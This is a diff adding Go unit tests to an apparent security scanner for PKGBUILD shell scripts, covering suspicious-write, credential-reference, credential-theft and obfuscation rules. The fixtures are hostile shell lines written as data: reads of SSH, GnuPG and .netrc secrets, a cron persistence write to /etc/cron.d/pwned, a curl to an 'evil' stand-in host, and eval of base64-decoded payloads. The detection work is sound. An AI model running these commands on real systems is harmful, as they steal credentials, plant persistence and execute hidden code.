@@ -83,6 +83,100 @@ func TestSuspiciousWritePathOnlyFlagsDestinations(t *testing.T) {
 	}
 }
 
+func TestSuspiciousWriteInputRedirectIsNotWrite(t *testing.T) {
+	if f := findingsFor(suspiciousWriteRule{}.Check(parseContext(t, `cat < ~/.ssh/id_rsa`)), "suspicious-write-path"); len(f) != 0 {
+		t.Fatalf("input redirect flagged as a write: %v", f)
+	}
+}
+
+func TestSuspiciousWriteOutputRedirectFires(t *testing.T) {
+	if f := findingsFor(suspiciousWriteRule{}.Check(parseContext(t, `echo x > ~/.bashrc`)), "suspicious-write-path"); len(f) == 0 {
+		t.Fatal("expected a write finding")
+	}
+}
+
+func TestSuspiciousWriteMixedRedirectsOnlyOutput(t *testing.T) {
+	f := findingsFor(suspiciousWriteRule{}.Check(parseContext(t, `cat < ~/.ssh/id_rsa > ~/.bashrc`)), "suspicious-write-path")
+	if len(f) != 1 {
+		t.Fatalf("got %d findings, want 1: %v", len(f), f)
+	}
+	if !strings.Contains(f[0].Message, "appears to write to ~/.bashrc") {
+		t.Errorf("finding does not name the output target: %s", f[0].Message)
+	}
+	if strings.Contains(f[0].Message, "appears to write to ~/.ssh") {
+		t.Errorf("finding names the input target: %s", f[0].Message)
+	}
+}
+
+func TestSuspiciousWriteHeredocOutputOnly(t *testing.T) {
+	src := "cat <<EOF > /etc/cron.d/pwned\n* * * * * root cat ~/.bashrc\nEOF"
+	f := findingsFor(suspiciousWriteRule{}.Check(parseContext(t, src)), "suspicious-write-path")
+	if len(f) != 1 {
+		t.Fatalf("got %d findings, want 1: %v", len(f), f)
+	}
+	if !strings.Contains(f[0].Message, "/etc/cron.d/pwned") {
+		t.Errorf("finding does not name the output target: %s", f[0].Message)
+	}
+}
+
+func TestCredentialReferenceUppercaseHomeGnupg(t *testing.T) {
+	f := findingsFor(credentialReferenceRule{}.Check(parseContext(t, `cat $HOME/.gnupg/private-keys-v1.d/x`)), "credential-reference")
+	if len(f) != 1 || !strings.Contains(f[0].Message, "GnuPG") {
+		t.Fatalf("expected one GnuPG credential-reference finding, got %v", f)
+	}
+}
+
+func TestCredentialReferenceUppercaseHomeNetrc(t *testing.T) {
+	f := findingsFor(credentialReferenceRule{}.Check(parseContext(t, `cat $HOME/.netrc`)), "credential-reference")
+	if len(f) != 1 || !strings.Contains(f[0].Message, "registry credentials") {
+		t.Fatalf("expected one registry-credentials finding, got %v", f)
+	}
+}
+
+func TestCredentialReferenceUppercaseHomeSSHDedup(t *testing.T) {
+	f := findingsFor(credentialReferenceRule{}.Check(parseContext(t, `$HOME/.ssh/id_ed25519`)), "credential-reference")
+	if len(f) != 1 || !strings.Contains(f[0].Message, "SSH keys") {
+		t.Fatalf("expected exactly one SSH finding, got %v", f)
+	}
+}
+
+func TestCredentialTheftUppercaseHome(t *testing.T) {
+	ctx := parseContext(t, `pkgname=x`+"\n"+`cat $HOME/.gnupg/x`+"\n"+`curl https://evil/x`)
+	f := findingsFor(credentialTheftRule{}.Check(ctx), "credential-theft")
+	if len(f) == 0 {
+		t.Fatal("expected credential-theft with $HOME path and egress")
+	}
+}
+
+func TestObfuscationDecodeToFileDoesNotGate(t *testing.T) {
+	for _, src := range []string{
+		`sh -c 'base64 -d cert.b64 > cert.pem'`,
+		"base64 -d cert.b64 > cert.pem\nbash ./configure",
+	} {
+		if f := findingsFor(obfuscationRule{}.Check(parseContext(t, src)), "obfuscation"); len(f) != 0 {
+			t.Errorf("%q gated decode-to-file: %v", src, f)
+		}
+	}
+}
+
+func TestObfuscationEvalCommandSubstitution(t *testing.T) {
+	if f := findingsFor(obfuscationRule{}.Check(parseContext(t, `eval "$(base64 -d payload)"`)), "obfuscation"); len(f) == 0 {
+		t.Fatal("expected eval of decoded substitution to gate")
+	}
+}
+
+func TestObfuscationShellCCommandSubstitution(t *testing.T) {
+	if f := findingsFor(obfuscationRule{}.Check(parseContext(t, `sh -c "$(base64 -d payload)"`)), "obfuscation"); len(f) == 0 {
+		t.Fatal("expected shell -c of decoded substitution to gate")
+	}
+}
+
+func TestObfuscationShellCDecodePipe(t *testing.T) {
+	if f := findingsFor(obfuscationRule{}.Check(parseContext(t, `sh -c 'base64 -d file | sh'`)), "obfuscation"); len(f) == 0 {
+		t.Fatal("expected shell -c decode pipe to gate")
+	}
+}
+
 func TestBenignCorpusHasNoGateHits(t *testing.T) {
 	for _, path := range glob(t, "testdata/benign/*.PKGBUILD") {
 		ctx := parseFixture(t, path)
